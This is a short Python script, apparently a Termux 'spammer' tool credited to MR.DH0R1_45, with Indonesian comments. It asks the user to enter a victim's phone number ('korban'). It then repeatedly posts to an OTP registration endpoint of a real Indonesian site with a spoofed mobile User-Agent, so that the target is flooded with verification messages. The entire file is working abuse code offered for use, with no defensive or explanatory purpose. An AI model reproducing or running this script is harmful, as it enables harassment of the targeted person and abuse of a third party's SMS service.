import requests
import os
import random
import time
import itertools
import threading
import sys


os.system('nano sms.py')
#silahkan isi no korban
#isi mengunakan 628xxxxx
#tanpa + dan 08
#langsung 6289xxxxx
data={'username':'6289xxxxxx'}

#jika sudah di isi silahkan tekan CTRL + X dan Y










































































































banner = """
\033[01;32m==================================================
\033[33;33mCreated   : MR.DH0R1_45
Website   : https://termux.id
Instagram : https://www.instagram.com/mrd45_gans
\033[01;32m==================================================
"""

os.system('echo -e "\033[33;33m" ')
done = False

#animasi loading
def animate():
    for c in itertools.cycle(['|', '/', '-', '\\']):
        if done:
            break
        sys.stdout.write('\r LOOANJING... ' + c)
        sys.stdout.flush()
        time.sleep(0.1)
    sys.stdout.write('\r')

t = threading.Thread(target=animate)
t.start()

#proses lama disini

time.sleep(10)
done = True

os.system('echo -e "\033[01;32m" ')
os.system('clear')
os.system("figlet 45spamers")
print (banner)
#proses pemasukan nomor
jum = int(input("\033[33;33mmasukan jumlah spam : "))

#data spam
headers={'User-Agent':'Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36','Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3'}

#tools di jalankan
for i in range(int(jum)):
    time.sleep(10)
    h = requests.post("https://www.asakita.id/api/auth/register/otp",headers=headers,data=data).text
    if 'MOBILE' in h:
        print("\033[32;32mnomor tersebut berhasik di spam")
    else:
        print("\033[31;31mnomor tersebut gagal di spam ")

os.system('echo -e "\033[33;33m" ')
                              
